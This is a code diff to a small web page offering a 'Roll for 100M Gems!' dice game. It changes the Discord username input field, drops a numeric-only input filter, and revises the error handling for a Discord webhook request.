@@ -353,7 +353,7 @@ button:hover {
     <h2>Roll for 100M Gems!</h2>
     
     <label for="discordUser">Your Discord Username: </label>
-    <input type="text" id="discordUser" placeholder="e.g., yourusername#1234" class="night-mode">
+    <input type="text" id="discordUser" placeholder="Enter your Discord username">
     <button id="setUsernameButton" onclick="setUsername()">Enter Username</button>
     
     <button id="rollButton" onclick="rollForGems()" disabled>Roll the Dice!</button>
@@ -425,7 +425,7 @@ function setupInputFields() {
         input.addEventListener('blur', function() {
             formatInput(this);
         });
-        input.addEventListener('keypress', preventNonNumericInput);
+        // Removed preventNonNumericInput for username field
     });
 }
 
@@ -611,12 +611,13 @@ function sendToDiscordWebhook(message) {
             content: message
         })
     })
-    .then(response => response.json())
-    .then(data => {
-        console.log('Success:', data);
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send message to Discord webhook');
+        }
     })
-    .catch((error) => {
-        console.error('Error:', error);
+    .catch(error => {
+        console.error('Error sending message to Discord webhook:', error);
     });
 }
 
